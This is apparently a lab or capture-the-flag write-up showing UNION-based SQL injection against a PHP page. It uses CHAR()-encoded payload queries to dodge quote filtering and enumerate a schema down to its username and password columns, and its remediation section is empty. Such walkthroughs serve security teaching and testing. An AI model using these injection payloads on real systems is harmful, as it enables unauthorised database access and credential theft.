# Brute Force

From exploiting [SQL Injection Vulneribilities](../0x0a-sql_injection-members/README.md), it is recoginzed that the schema `Member_Brute_Force` existed on the database. We know the schema exists, but certainly don't know what tables, or other information exists in the schema.

But using the query `1 and 1=1 UNION SELECT table_name, 2 FROM information_schema.tables WHERE table_schema='Member_Brute_Force'` will give an error, as the quotation would cause an error from the php.

In order to bypass, following script will create a set of char:

```
$ python -c 'print([ord(c) for c in "Member_Brute_Force"]);'
[77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101]
```

so this can be directly used as this
```
where table_schema='Member_Brute_Force'
where=CHAR([77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101])

#query
1 and 1=1 union select table_name,0 from information_schema.tables where table_schema=CHAR(77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101)
```

by doing so, we can find `db_default` table in `Member_Brute_Force` schema:

(Image Here)

In order to take a look at the `db_default` table in `Member_Brute_Force` schema, following query needs to be executed, but as the php causes an error, it needs to be changed as well

```
#before
1 and 1=1 UNION SELECT column_name, 2 FROM information_schema.tables WHERE table_schema='Member_Brute_Force' and table_name='db_default'
#after
1 and 1=1 union select column_name, 2 from information_schema.columns where table_schema=CHAR(77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101) and table_name=CHAR(100, 98, 95, 100, 101, 102, 97, 117, 108, 116)
```

By doing so, we can acknowledge there are four columns `one`, `id`, `username`, `password`

(image)

## Remediation

